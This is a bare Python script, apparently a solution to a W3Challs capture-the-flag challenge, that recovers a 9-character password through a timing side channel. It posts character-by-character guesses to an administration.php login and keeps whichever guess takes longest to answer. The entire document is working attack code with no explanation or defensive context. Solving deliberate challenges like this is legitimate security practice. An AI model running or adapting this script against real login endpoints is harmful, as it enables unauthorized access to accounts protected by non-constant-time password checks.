from string import ascii_lowercase
import requests
import time
def time_req(password):
    start = time.time()
    r = requests.post('https://temporal.hax.w3challs.com/administration.php', data={'your_password': password})
    end = time.time()
    return (end - start, 'Congratulations' in r.text)
password = 'a'*9
for i in range(0, len(password)):
    print(password)
    (_, works) = time_req(password)
    if works:
        print('found')
        break
    maxp = -1
    maxpw = None
    for c in ascii_lowercase:
        newp = password[:i] + c + 'a' * (len(password)-1-i)
        (t, works) = time_req(newp)
        if t > maxp:
            maxp = t 
            maxpw = newp 
    password = maxpw
print('final:')
print(password)
    

